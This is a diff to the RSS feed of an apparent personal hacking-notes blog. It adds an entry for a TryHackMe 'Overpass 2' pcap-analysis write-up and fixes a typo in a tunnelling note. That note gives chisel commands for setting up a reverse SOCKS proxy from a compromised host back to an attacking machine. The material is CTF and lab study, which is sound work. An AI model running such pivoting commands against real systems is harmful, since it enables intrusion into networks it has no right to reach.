@@ -17,6 +17,17 @@
     </item>
     
     <item>
+      <title>Overpass 2</title>
+      <link>/hacking/tryhackme/overpass2/overpass_2/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hacking/tryhackme/overpass2/overpass_2/</guid>
+      <description>For this room you start off by analyzing a pcap file.
+Pcap file Just from looking at the start of the capture we can see that a file was uploaded to the /Development/ page and if you follow the tcp stream you see what code was uploaded
+Code uploaded To look at what the attacker was doing on the machine I applied a filter to show the packets with a source port 4242 using &amp;ldquo;tcp.</description>
+    </item>
+    
+    <item>
       <title>Privesc</title>
       <link>/hacking/notes/privesc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -45,7 +56,7 @@ look in the /etc/crontab file and look at what jobs are running if there is no f
       
       <guid>/hacking/notes/tunnelling/</guid>
       <description>Chisel use webserver method to transfer files or use scp scp -i Key chisel user@target:/tmp/chisel has two modes server and client reverse SOCKS proxy
-set up listener on attaacking box ./chisel server -p listenPort &amp;ndash;reverse &amp;amp; on the compromised host ./chisel client attackingIP:listenPort R:socks &amp;amp; port for sending data back through the proxy will be different forward SOCKS proxy
+set up listener on attacking box ./chisel server -p listenPort &amp;ndash;reverse &amp;amp; on the compromised host ./chisel client attackingIP:listenPort R:socks &amp;amp; port for sending data back through the proxy will be different forward SOCKS proxy
 on compromised host ./chisel server -p listenPort &amp;ndash;socks5 on attacking box .</description>
     </item>
     
